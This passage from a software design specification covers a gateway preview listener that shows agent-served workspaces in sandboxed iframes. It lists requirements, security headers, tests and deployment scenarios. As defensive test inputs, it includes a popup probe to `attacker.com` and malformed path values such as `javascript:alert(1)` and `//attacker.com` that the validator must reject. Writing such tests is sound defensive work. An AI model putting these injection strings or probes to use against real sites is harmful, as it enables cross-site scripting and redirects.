| 5 | new window via `window.open('https://attacker.com')` | blocked or sandboxed (no escape via `allow-popups-to-escape-sandbox`) | (Mn-08) | popup retains sandbox |

### Regression Test Requirements

| Existing Behaviour | Existing Test | New Regression Test Needed |
|---|---|---|
| `serve_workspace` returns JSON with `url` field | `pkg/tools/serve_workspace_test.go` | YES — `TestServeWorkspaceResult_PreservesUrlField` (additive `path` does not remove `url`) |
| `/serve/<agent>/<token>/` serves the correct file from the workspace | `pkg/gateway/rest_serve_test.go` | YES — full rewrite. Old test relied on `RequireSessionCookieOrBearer`; new test asserts token-only auth (C-01) |
| `/serve/` returns 401 on expired token | `pkg/gateway/rest_serve_test.go` | YES — assert 401 (not 410) is preserved; matches FR-018 |
| `/dev/` proxies dev-server requests with auth | `pkg/gateway/rest_dev_test.go` | YES — full rewrite; new auth model |
| Legacy transcript replay shows the tool result block | `tests/e2e/replay-fidelity.spec.ts: (a)` | YES — extend with a `0.0.0.0:5000` URL fixture |
| `GET /api/v1/about` returns version + uptime | `pkg/gateway/rest_settings_test.go: TestHandleAbout` | YES — assert new fields are present |
| Cookie SameSite=Strict + no Domain | `pkg/gateway/middleware/session_cookie.go` tests | NO — unchanged |
| `canonicalGatewayOrigin` handles host-with-scheme | (existing tests in `origin_test.go`) | YES — `TestCanonicalGatewayOrigin_PublicURLOverride` |

---

## Functional Requirements

- **FR-001**: When `gateway.preview_listener_enabled` is true (default), the gateway MUST bind two HTTP listeners — main at `gateway.host:gateway.port`, preview at `(gateway.preview_host or gateway.host):gateway.preview_port`.
- **FR-002**: When `gateway.preview_port` is unset, the gateway MUST default it to `gateway.port + 1`.
- **FR-003**: The gateway MUST fail to boot when `gateway.preview_port == gateway.port`.
- **FR-004**: The gateway MUST fail to boot when `gateway.preview_port` (after derivation) is outside `[1, 65535]`.
- **FR-004a**: When auto-derivation produces an out-of-range port (e.g. `port + 1 == 65536`), the boot error MUST name the overflow specifically and instruct the operator to set `gateway.preview_port` explicitly.
- **FR-005**: The preview listener MUST register exactly two route trees: `/serve/...` and `/dev/...`. ALL other paths (including `/`, `/index.html`, `/api/...`, `/health`, `/ready`, `/onboarding`, `/login`, the SPA fallback) MUST return 404 from the preview listener.
- **FR-006**: The main listener MUST NOT register `/serve/...` or `/dev/...` route trees.
- **FR-007**: Every response from `/serve/...` and `/dev/...` MUST include exactly one `Content-Security-Policy` header with `frame-ancestors '<main_origin>'` (NOT the literal string `'<main_origin>'` — the actual computed origin). When the gateway cannot derive a browser-realistic `<main_origin>` (host=`0.0.0.0` or `[::]` AND `gateway.public_url` is unset), the directive falls back to `frame-ancestors '*'` and a one-time WARN log line is emitted at boot stating the fallback (FR-007e). When `gateway.public_url` is set, `<main_origin>` is the value of that field. Otherwise `<main_origin>` is `canonicalGatewayOrigin(cfg)`.
- **FR-007a**: The preview listener MUST handle `OPTIONS` preflights for `/serve/<...>` and `/dev/<...>` for the benefit of operator tooling (curl, monitoring probes). The SPA's warmup mechanism uses iframe navigation (NOT `fetch`), so CORS is NOT part of the SPA-flow auth boundary. When the request `Origin` matches `<main_origin>`, the response MUST include `Access-Control-Allow-Origin: <main_origin>`, `Access-Control-Allow-Methods: GET, HEAD, OPTIONS`, `Access-Control-Max-Age: 86400`, and `Vary: Origin`. Foreign origins MUST NOT receive an allow header (MR-08 reframed).
- **FR-007b**: Every response from `/serve/...` and `/dev/...` MUST include `Referrer-Policy: no-referrer`. (Already set today by `setWorkspaceSecurityHeaders` at line 99 — no change needed for `/serve/`; new for `/dev/` since `proxyDevRequest` does not set headers today.)
- **FR-007c**: The constant `workspaceCSP` in `pkg/gateway/rest_workspace.go:64-66` MUST be replaced with a function `buildWorkspaceCSP(mainOrigin string) string` that returns a CSP with `frame-ancestors '<mainOrigin>'` (NOT `'none'`) and `connect-src 'self'` (NOT `'none'`). Rationale: hydrated SPA builds (Vite, Next.js exports) need to fetch their own `/data.json` and similar from the served origin; `'self'` permits this without granting external network access. All other directives in `workspaceCSP` (`default-src 'none'`, `script-src 'unsafe-inline'`, etc.) remain unchanged. (CR-01)
- **FR-007d**: `proxyDevRequest` (`pkg/gateway/rest_dev.go:146`) MUST install an `rp.ModifyResponse` callback that strips any upstream `Content-Security-Policy` and `X-Frame-Options` headers from the dev server's response BEFORE the gateway injects its own headers. Rationale: Next.js / Vite dev servers emit their own CSP including `'unsafe-eval'` for HMR; if both headers reach the browser, the browser intersects them, breaking HMR. The gateway-injected CSP is authoritative. (MR-04 / CR-01)
- **FR-007e**: When `cfg.Gateway.Host == "0.0.0.0"` or `"[::]"` and `cfg.Gateway.PublicURL` is unset, the gateway MUST emit a single WARN log line at boot: `frame-ancestors fallback to '*' — set gateway.public_url for strict embedding control`. The CSP `frame-ancestors` directive uses `'*'` in this case. Operators wanting strict embedding control on bare-IP deployments MUST set `gateway.public_url` to a browser-realistic origin (e.g. `http://146.190.89.151:5000`). (MR-03)
- **FR-008**: `serve_workspace` tool result schema MUST include a `path` field (relative URL) in addition to the existing `url` and `expires_at` fields. Both `path` and `url` are emitted in fresh tool results going forward (neither is deprecated for tool results — only the wiring concern `Tier13Deps.GatewayBaseURL` is deprecated per FR-021). MN-03 resolved.
- **FR-008a**: `run_in_workspace` tool result schema MUST be migrated from the current `SilentResult(<English sentence>)` (`pkg/tools/run_in_workspace.go:354-358`) to a structured tool result via `NewToolResult` carrying TWO surfaces: (1) a JSON `result` field with shape `{path: "/dev/<agent>/<token>/", url: "<absolute URL>", expires_at: "<ISO-8601>", command: "<cmd>", port: <int>}` consumed by the SPA's `RunInWorkspaceUI`, AND (2) a human `summary` field carrying the existing English sentence so the LLM continues to see a natural-language explanation of what happened. The change is a breaking schema migration; eval harnesses and skill prompts that grepped the old sentence MUST be updated. Add a regression test asserting both surfaces are present. (CR-03)
- **FR-009**: `GET /api/v1/about` response MUST include `preview_port` (int), `preview_listener_enabled` (bool), `warmup_timeout_seconds` (int, sourced from `cfg.Tools.RunInWorkspace.WarmupTimeoutSeconds`), and MAY include `preview_origin` (string) when `gateway.preview_origin` is set.
- **FR-010**: The SPA MUST construct iframe URLs using `gateway.preview_origin` if returned by `/api/v1/about`, otherwise from `window.location.protocol`, `window.location.hostname`, and the advertised `preview_port`.
- **FR-010a**: When the SPA detects a scheme mismatch (HTTP main + HTTPS preview), it MUST refuse to mount the iframe and show an error block with a `console.warn` message instead.
- **FR-010b**: Before setting `iframe.src`, the SPA MUST validate the `path` field against the regex `^/(?:serve|dev)/[A-Za-z0-9_\-]+/[A-Za-z0-9_\-]+(?:/.*)?$`. If validation fails (e.g. `path = "javascript:alert(1)"`, `path = "//attacker.com"`, `path = "/api/v1/agents"`), the SPA MUST fall back to the link-only block, emit `console.warn`, and NOT call `window.open` or set `iframe.src` with the malformed value. This is XSS / open-redirect mitigation against a buggy or malicious tool result. (MR-10)
- **FR-011**: `serve_workspace` and `run_in_workspace` tool UI components MUST render an `<iframe>` with `sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"` (NO `allow-top-navigation`, NO `allow-popups-to-escape-sandbox`).
- **FR-012**: The iframe component MUST expose three controls in its chrome bar: Reload (live state) / Retry (placeholder/error state), Open-in-new-tab, Copy-link with toast warning.
- **FR-012a**: The "Copy link" toast text MUST be exactly: `Link copied. Anyone with this link can view the preview until it expires.`
- **FR-012b**: All chrome-bar controls MUST have `aria-label` attributes and be keyboard-focusable.
- **FR-013**: `RunInWorkspaceUI` MUST poll the preview URL via a hidden probe-iframe (NOT cross-origin fetch). Probe schedule: probe 1 at t=0, subsequent probes every 2 s thereafter, until either (a) a probe `onload` fires or (b) the configured timeout elapses. Each probe times out at 1.8 s. The visible iframe mounts on the first probe `onload`. The total warmup timeout is sourced from `cfg.Tools.RunInWorkspace.WarmupTimeoutSeconds`, default 60 s, exposed to the SPA via `/api/v1/about` as `warmup_timeout_seconds`. (Q3 resolved → config knob.)
- **FR-014**: After warmup-timeout-seconds elapse without a successful probe `onload` (default 30 attempts × 2 s = 60 s), `RunInWorkspaceUI` MUST replace the placeholder with an error block with a "Retry" button that restarts polling from probe 1.
- **FR-015**: When the iframe `onerror` fires after mounting, the component MUST replace the iframe with a fallback link block.
- **FR-016**: The chat markdown link renderer MUST rewrite the host of any `<a>` whose hostname is in `{0.0.0.0, [::], [::0], 0, 127.0.0.1}` to `window.location.hostname`, preserving path, query, fragment.
- **FR-017**: When the rewritten URL targets `/serve/` or `/dev/`, the renderer MUST also swap the port to `preview_port`. Otherwise the original port is preserved.
- **FR-017a**: Markdown links with non-`http(s)` schemes (`mailto:`, `javascript:`, `tel:`, `data:`) MUST pass through unchanged.
- **FR-017b**: The host-rewrite logic MUST be implemented in a shared utility `src/lib/preview-url.ts` and called by both `markdown-text.tsx` and the tool-UI components (resolves O-02).
- **FR-018**: Existing `/serve/` handler returns **401** for expired/unknown tokens (M-07 resolved — keep current behaviour, document in spec).
- **FR-019**: The SPA MUST fall back to a link-only block when a tool result has neither `path` nor a parseable `url` field.
- **FR-020**: Boot logging MUST emit two info-level lines via `slog`, in this order: `gateway listening on <main_addr>` then `preview listening on <preview_addr>`. When `preview_listener_enabled = false`, the second line is replaced with `preview listener disabled by config`.
- **FR-021**: `Tier13Deps` MUST gain a `GatewayPreviewBaseURL` field. The existing `GatewayBaseURL` is **deprecated** and kept for one release for replay safety; a follow-up issue MUST be created to remove it (Mn-04 resolved).
- **FR-022**: `pkg/gateway/middleware/origin.go: canonicalGatewayOrigin` MUST be extended to prefer `cfg.Gateway.PublicURL` when set, falling back to the existing host+port computation.
- **FR-023**: The preview listener auth model MUST be token-only: no `RequireSessionCookieOrBearer` middleware, no `AuthorizeAgentAccess` handler-internal check. Token validity (existence in `servedSubdirs`, agent match, TTL) is the sole credential.
- **FR-023a**: `pkg/gateway/rest_dev.go: HandleDevProxy` (line 133) MUST drop the `middleware.RequireMatchingOriginOnStateChanging` wrapper. Rationale: the iframe runs from `<preview_origin>` and any form POST inside it carries `Origin: <preview_origin>` which never matches the main origin, so the existing CSRF check rejects all legitimate iframe POSTs with 403. The path token is the credential and is itself only mintable by an authenticated agent loop, so a foreign-origin CSRF attack on `/dev/<agent>/<token>/` is already blocked by `frame-ancestors` (T-04) — re-validating Origin here is redundant and harmful. (CR-02)
- **FR-024**: The `/serve/` and `/dev/` handlers MUST emit audit events under the existing `serve.*` and `dev.*` namespaces (Q5). Successful events: `serve.served` (Info level, **first request per token only** — subsequent requests on the same token within the token's TTL are NOT logged) and `dev.proxied` (Debug level by default, escalated to Warn on rate anomaly >100 events/min/agent). Each event payload schema:
  ```json
  {
    "agent_id": "<string>",
    "token_prefix": "<first 8 chars of token>",
    "sanitised_path": "/serve/<agent>/<redacted>/<remaining>",
    "method": "<HTTP method>",
    "status": <int>,
    "remote_ip": "<X-Forwarded-For canonicalised, else r.RemoteAddr>",
    "bytes_out": <int, optional>,
    "duration_ms": <int>
  }
  ```
  Rationale: a Next.js dev server can fire hundreds of asset requests per page load; per-asset auditing floods the bus. First-token-issuance is already logged by `run_in_workspace` itself; per-asset is at Debug only. (MR-01 / OB-02)
- **FR-024a**: Failure responses on `/serve/` and `/dev/` MUST emit audit events under the `serve.*` / `dev.*` namespaces with `decision: "deny"` (401, 403) or `decision: "error"` (400, 404). Event names: `serve.token_invalid` (401), `serve.token_agent_mismatch` (403), `serve.path_invalid` (404), `serve.malformed_url` (400), and `dev.*` siblings. These are at Warn level so token-guessing probes are visible to operators. (MR-07)
- **FR-025**: The SPA MUST log a `console.warn` and (if telemetry is wired) emit a `preview.warmup_timeout` event when the warmup hits 60 s without success. (Resolves M-10.)
- **FR-026**: `omnipus doctor` MUST add three checks: (a) warn if `gateway.preview_port < 1024` (privileged), (b) warn if `gateway.preview_port` is in another channel's known port range, (c) info-level note about reverse-proxy requirements when `gateway.public_url` is unset and `host = 0.0.0.0`. (Resolves O-04.)
- **FR-027**: `gateway.preview_listener_enabled` defaults to true on Linux/Windows/macOS, defaults to **false on Android/Termux** (autodetected via `runtime.GOOS == "android"`). When false, the SPA renders tool results as link-only (legacy behaviour). The flag is documented as an emergency-rollback knob, not a permanent option. (MR-09)
- **FR-027a**: Cross-field validation: when `gateway.preview_listener_enabled` is false but `gateway.preview_origin` is set, the gateway MUST fail to boot with a clear error stating the contradiction. Rationale: an operator who sets a public preview origin but disables the listener has misconfigured their deployment. (Unasked Question #14)
- **FR-027b**: All five `gateway.preview_*` fields and `tools.run_in_workspace.warmup_timeout_seconds` MUST be flagged as restart-required in `pkg/gateway/rest_pending_restart.go`. Hot-reload is NOT supported for these fields because changing a listener's bind address mid-process races with active connections. (MR-02)
- **FR-027c**: `gateway.preview_port == gateway.port` validation (FR-003) MUST be skipped when `gateway.preview_listener_enabled` is false. Rationale: when the preview listener is off, the port collision is moot. (MR-06)
- **FR-028**: `gateway.preview_host` defaults to `gateway.host`. Operators set it to `127.0.0.1` to keep the preview listener private behind a reverse proxy. Equality comparison normalises IPv6 brackets (`[::]` ≡ `::`) before checking against `gateway.host` to avoid spurious bind-twice failures. (MN-01)

---

## Success Criteria

- **SC-001**: After this change, on a deployment bound to `0.0.0.0:5000`, an agent calling `serve_workspace` produces a tool result whose iframe in the chat surface successfully loads served content within 5 s in 100 % of test runs (`playwright/serve-iframe.spec.ts: a)` baseline).
- **SC-002**: After this change, on a fresh test corpus of 5 sessions seeded with legacy `0.0.0.0` URLs (newly defined in `tests/e2e/fixtures/legacy-host-corpus.json`), 0 rendered links contain the host string `0.0.0.0` (replaces the unmeasurable "50-session corpus" — review M / SC-002).
- **SC-003**: A 5-pronged penetration probe (Dataset: Cross-origin attack probe) injected into a served `index.html` results in: 0 successful reads of SPA `localStorage`, 0 successful API calls, 0 outbound `Referer` headers carrying tokens, 0 successful top-navigations, 0 popup escapes from sandbox.
- **SC-004**: `RunInWorkspaceUI` correctly transitions from placeholder to live iframe within 2 s of the dev server first responding 200 in 100 % of test runs against a fixture that delays binding by 5 s.
- **SC-005**: The full Playwright e2e suite passes after this change with 0 new failures (replaces "40-test pass count" with explicit "0 new failures vs prior CI run" — review SC-005).
- **SC-006**: Backend unit-test coverage for the touched files (`pkg/gateway/gateway.go`, `pkg/gateway/rest_serve.go`, `pkg/gateway/rest_dev.go`, `pkg/channels/manager.go`, `pkg/config/config.go`) is ≥ 85 % (lines).
- **SC-007**: After a default-config boot, `omnipus doctor` reports exactly the new checks added by FR-026 — no spurious warnings outside that set.
- **SC-008**: The preview listener serves 30 concurrent warmup probes for 60 s without growing process RSS by more than 50 MB (resource leak guard — review gap #8).

---

## Traceability Matrix

| Requirement | User Story | BDD Scenario(s) | Test Name(s) |
|---|---|---|---|
| FR-001 | US-3, US-6 | "Default preview port…" / "Preview listener is disabled by feature flag" | `TestGateway_TwoListeners_Boot`, `TestGateway_PreviewListenerDisabled` |
| FR-002 | US-3 | "Default preview port…" | `TestGatewayConfig_PreviewPort_DefaultDerivation` |
| FR-003 | US-3 | "Boot fails when…" | `TestGatewayConfig_PreviewPort_CollisionRejected` |
| FR-004, FR-004a | US-3 | "Auto-derived preview port overflow boundary" | `TestGatewayConfig_PreviewPort_OverflowRejected`, `TestGatewayConfig_ValidationOrder` |
| FR-005 | US-1, US-4 | "Preview listener returns 404…" + "Served JS cannot reach /api/v1/*" | `TestPreviewMux_404ForUnregisteredPaths`, `TestGateway_PreviewMux_DoesNotExposeAPI` |
| FR-006 | US-1, US-3 | (Non-Behavior) | `TestGateway_MainMux_DoesNotExposeServe` |
| FR-007 | US-5 | "Embed by foreign origin…" | `TestServePreview_FrameAncestorsHeader`, `TestDevPreview_FrameAncestorsHeader` |
| FR-007a | US-5, US-2 | "OPTIONS preflight from main origin is accepted" / "…rejected" | `TestServePreview_CORSPreflight_AllowsMainOrigin`, `TestServePreview_CORSPreflight_RejectsForeignOrigin` |
| FR-007b | US-4 | "Token does not leak via Referer" | `TestServePreview_ReferrerPolicyHeader` |
| FR-008 | US-1, US-2 | "Iframe renders live…" | `TestServeWorkspaceResult_Schema_AdditiveFields`, `TestRunInWorkspaceResult_Schema_AdditiveFields` |
| FR-009 | US-3, US-5, US-6 | "Default preview port…" / "Preview listener is disabled…" | `TestHandleAbout_PreviewFields` |
| FR-010, FR-010a | US-1, US-5 | "Iframe renders live…" / US-5 AS-3 | `iframe-preview.test.tsx: scheme mismatch shows error`, `playwright/serve-iframe.spec.ts: a)` |
| FR-011 | US-1, US-4 | "Iframe renders live…" + "Top-navigation is blocked…" | `iframe-preview.test.tsx: renders iframe with sandbox attrs` |
| FR-012, FR-012a, FR-012b | US-1 | "Open-in-new-tab uses direct window.open" / "Copy-link warns…" / a11y | `iframe-preview.test.tsx: open-in-new-tab uses window.open`, `iframe-preview.test.tsx: copy-link emits warning toast`, `iframe-preview.test.tsx: a11y` |
| FR-013 | US-2 | "Warmup uses iframe-load polling…" / "Warmup probe schedule is fixed" | `iframe-preview.test.tsx: warmup polls via iframe-load and swaps`, `playwright/run-iframe.spec.ts: warmup transition` |
| FR-014 | US-2 | "Warmup gives up after 30 unsuccessful probes" | `iframe-preview.test.tsx: warmup gives up after 30 attempts`, `iframe-preview.test.tsx: retry restarts the loop`, `playwright/run-iframe.spec.ts: warmup retry` |
| FR-015 | US-1, US-2 | (Edge Cases) | `iframe-preview.test.tsx: scheme mismatch shows error` (negative-load surrogate) |
| FR-016, FR-017, FR-017a, FR-017b | US-1 | "Rewrite legacy hosts…" | `preview-url.test.ts: rewriteLegacyURL all cases`, `markdown-text.test.tsx: rewrites legacy URLs via shared util` |
| FR-018 | US-1 | "Expired token returns 401" | (covered in `TestServePreview_NoAuth_RequiresValidToken`) |
| FR-019 | US-1 | "Replay rewrites legacy 0.0.0.0 URLs…" | `serve_workspace_replay.test.tsx: rewrites legacy URL on render` |
| FR-020 | US-3, US-6 | "Default preview port…" / "Preview listener is disabled…" | `TestGateway_TwoListeners_Boot`, `TestGateway_PreviewListenerDisabled` (log assertion) |
| FR-021 | US-1, US-2 | "Iframe renders live…" | `TestServeWorkspaceTool_E2E_ReturnsRelativePath` |
| FR-022 | US-5 | "Embed by foreign origin…" | `TestCanonicalGatewayOrigin_PublicURLOverride` |
| FR-023 | US-1, US-4 | "Token-only authentication on /serve/" | `TestServePreview_NoAuth_RequiresValidToken` |
| FR-024 | (observability) | (no BDD; audit-event assertion) | `TestServePreview_AuditEventEmitted` (added) |
| FR-025 | US-2 | (Behavioral Contract Error flows) | `iframe-preview.test.tsx: warmup gives up after 30 attempts` (console.warn assertion) |
| FR-026 | (operability) | (no BDD; doctor) | `TestDoctor_PreviewPortChecks` (added) |
| FR-027 | US-6 | "Preview listener is disabled by feature flag" | `TestGateway_PreviewListenerDisabled`, `TestGateway_PreviewListenerEnabled_AndroidDefault` |
| FR-027a | US-6 | (cross-field) | `TestGatewayConfig_PreviewOriginRequiresEnabled` |
| FR-027b | (operability) | (pending-restart) | `TestPendingRestart_PreviewFields` |
| FR-027c | US-3, US-6 | (Boundary conditions) | `TestGatewayConfig_ValidationOrder` (extended) |
| FR-028 | US-3 | "Preview listener can bind to a different host" | `TestGateway_PreviewHost_DistinctFromMain` |
| FR-007c | US-1, US-4 | "/serve/ response replaces frame-ancestors 'none' with <main_origin>" | `TestWorkspaceCSP_FrameAncestorsFromMainOrigin` |
| FR-007d | US-2, US-4 | "/dev/ response strips upstream CSP" | `TestProxyDevRequest_StripsUpstreamCSP` |
| FR-007e | US-3 | "frame-ancestors '*' fallback…" | `TestWorkspaceCSP_FrameAncestorsFallback` |
| FR-008a | US-2 | "Tool result carries both JSON and human summary" | `TestRunInWorkspaceTool_JSONSchema` |
| FR-010b | US-1, US-4 | "Reject malformed path values" | `iframe-preview.test.tsx: rejects malformed path` |
| FR-023a | US-2 | "Form POST inside the dev iframe is accepted" | `TestHandleDevProxy_NoOriginMiddleware` |
| FR-024a | (security) | (Behavioral Contract) | `TestServePreview_AuditEvents_Failure`, `TestServePreview_AuditEvents_FirstRequestOnly` |

**Completeness check**: Every FR-xxx is referenced. Every BDD scenario is referenced. Every test in the Test Implementation Order table is referenced. Holdout scenarios are explicitly outside this matrix.

---

## Ambiguity Warnings

All ambiguities have been resolved by user interview on 2026-04-26.

| # | Question | Resolution |
|---|---|---|
| 1 | "Open in new tab" target — wrapper SPA route or direct `window.open`? | **Direct `window.open(<url>, '_blank', 'noopener,noreferrer')`.** No SPA wrapper page. (Q1) |
| 2 | Replay rendering — iframe (with rewrite) for legacy transcripts, or link-only for legacy? | **Always iframe; SPA-side host-rewrite handles legacy `0.0.0.0` URLs.** (Q2) |
| 3 | Warmup timeout — hardcoded 60 s vs config knob? | **Config knob `cfg.Tools.RunInWorkspace.WarmupTimeoutSeconds`, default 60.** Exposed via `/api/v1/about` as `warmup_timeout_seconds`. (Q3) |
| 4 | Per-token subdomain isolation now or deferred? | **Deferred.** Single-tenant cross-talk (T-05) accepted; subdomain-per-token is the named SaaS-migration path. (Q4) |
| 5 | Audit category for `serve.served` / `dev.proxied`? | **Existing namespaces.** Events sit under `serve.*` and `dev.*` (siblings to `dev.origin_denied`, etc.). No new `network` top-level. (Q5) |
| 6 | Health endpoint on the preview listener? | **No.** Preview listener serves only `/serve/...` and `/dev/...`; everything else (including `/health`, `/ready`, `/`, `/index.html`, `/api/...`, `/onboarding`) returns 404. Operators rely on the main port's `/health`. (Q6) |
| 7 | (was) "Open in new tab" Mn-01 simplification | (subsumed by Q1) |
| 8 | Doctor checks (FR-026) | Three checks: privileged-port warn, port-range overlap with channels, reverse-proxy advisory when `host=0.0.0.0` and `public_url` unset. |
| 9 | `allow-popups-to-escape-sandbox` | Dropped (Mn-08 resolved). |

---

## Evaluation Scenarios (Holdout)

> Post-implementation evaluation. NOT in TDD plan or traceability matrix.

### Scenario: Public-IP smoke test on bare deployment
- **Setup**: Fresh DigitalOcean droplet, default config, `gateway.host = 0.0.0.0`, `gateway.port = 5000`, no DNS, no proxy.
- **Action**: From a different machine, browse to `http://<droplet-ip>:5000`, log in, ask Mia to "serve this directory".
- **Expected**: Inline iframe shows the served homepage within 10 s. "Open in new tab" opens the same content. **Category**: Happy Path.

### Scenario: Local install on a laptop
- **Setup**: Default config (`localhost:5000`).
- **Action**: Browse `http://localhost:5000`, run flow.
- **Expected**: iframe URL shows `localhost:5001`. **Category**: Happy Path.

### Scenario: Reverse-proxy production deployment
- **Setup**: nginx with two server blocks → `127.0.0.1:5000` and `127.0.0.1:5001`. `gateway.public_url = "https://omnipus.example.com"`, `gateway.preview_origin = "https://preview.omnipus.example.com"`.
- **Action**: HTTPS, run a `serve_workspace` test.
- **Expected**: iframe `src` on `preview.omnipus.example.com`; no mixed-content warnings. **Category**: Happy Path.

### Scenario: Hostile served content does not exfiltrate
- **Setup**: Serve a directory with a 5-pronged probe (Dataset: Cross-origin attack probe).
- **Action**: Inspect SPA cookies, gateway access logs, `/api/v1/agents` calls, browser network panel for `Referer` headers.
- **Expected**: 0 successful exfils across all 5 prongs. **Category**: Error / Edge.

### Scenario: Replay an old transcript
- **Setup**: Open a session whose transcript has a `0.0.0.0:5000` URL from before this fix.
- **Action**: Scroll to the tool block.
- **Expected**: Iframe loads via host-rewrite. **Category**: Edge.

### Scenario: Rollback flag flip
- **Setup**: After deploying, an operator sees an issue with iframe rendering. They edit `config.json` to set `gateway.preview_listener_enabled = false` and SIGHUP.
- **Action**: Trigger `serve_workspace`.
- **Expected**: Tool renders link-only block; preview listener is no longer bound. **Category**: Edge.

### Scenario: Operator runs two omnipus instances on one VPS
- **Setup**: Instance A on 5000+5001, Instance B on 5500+5501. Both bind successfully.
- **Action**: Trigger `serve_workspace` on each.
- **Expected**: Each iframe URL points at its own preview port. **Category**: Edge.

### Scenario: Reload vs Retry semantics
- **Setup**: Spawn a slow-bind dev server. While placeholder is showing, click button. Then once iframe is live, click button.
- **Action**: Two clicks at different states.
- **Expected**: First click ("Retry") restarts polling counter at 1. Second click ("Reload") refreshes the iframe `src` only. **Category**: Edge.

---

## Documentation Deliverables (resolves O-05)

This change ships with documentation updates:

1. **README quickstart** — note about opening two ports (5000 + 5001) on the firewall.
2. **CLAUDE.md operator section** — mention `gateway.preview_port`, `gateway.preview_origin`, `gateway.public_url`, `gateway.preview_listener_enabled`.
3. **`docs/operations/reverse-proxy.md`** (new) — nginx and Caddy examples for two-port reverse-proxy setups with shared wildcard cert.
4. **`docs/operations/security-considerations.md`** (new) — explicit threat-model summary mirroring the Threat Model section of this spec; called out for operators reviewing the deployment.
5. **In-app "Copy link" toast copy** — already specified in FR-012a.

---

## Assumptions

- The SPA is served from the same Go binary as the gateway via `go:embed` (CLAUDE.md confirmed).
- All target browsers (Chrome, Firefox, Safari, Edge, Electron's Chromium) honour `Content-Security-Policy: frame-ancestors`, `Referrer-Policy`, the `sandbox` attribute, and CORS preflights.
- Operators on bare-IP deployments can expose a second port. README updates accompany.
- The two-port topology does not violate any existing "one port" assumption in the deployment chain (single Dockerfile EXPOSE, single load-balancer rule). Verified: existing Dockerfile and systemd unit already accept `OMNIPUS_GATEWAY_PORT` env; ops docs will be extended.
- The audit-bus has capacity for the new `serve.served` and `dev.proxied` events at typical load (≈10 events/min/agent).
- Token TTLs unchanged. Per-agent serve cap unchanged.
- The existing `RequireSessionCookieOrBearer` middleware on `/serve/` and `/dev/` was a defence-in-depth on top of the URL token; removing it does not lower security because the URL token was already the primary credential. Documented in Threat Model.

## Clarifications

### 2026-04-26

- Q: Subdomain or path or port? → A: Port (no DNS dependency).
- Q: `allow-same-origin`? → A: Yes (iframe is cross-origin to SPA).
- Q: Inline canvas or wrapper page? → A: Inline iframe + new-tab button only.
- Q: Replay safety horizon? → A: Indefinite.
- Q: Warmup via SPA polling or backend pre-flight? → A: SPA polling via iframe-load (resolves C-02 — no cross-origin fetch).
- Q: Auth on `/serve/` and `/dev/` on the preview port? → A: Token-only. Path token is the bearer credential. Documented.
- Q: 401 vs 410 for expired tokens? → A: 401 (matches existing handler).
- Q: `allow-popups-to-escape-sandbox`? → A: Dropped.
- Q: Preview-listener observability? → A: Audit events `serve.served` / `dev.proxied`; SPA `console.warn` on warmup timeout.
- Q: Rollback flag? → A: Yes — `gateway.preview_listener_enabled`.
- Q: Per-token subdomains? → A: Out of scope this PR; named migration path.
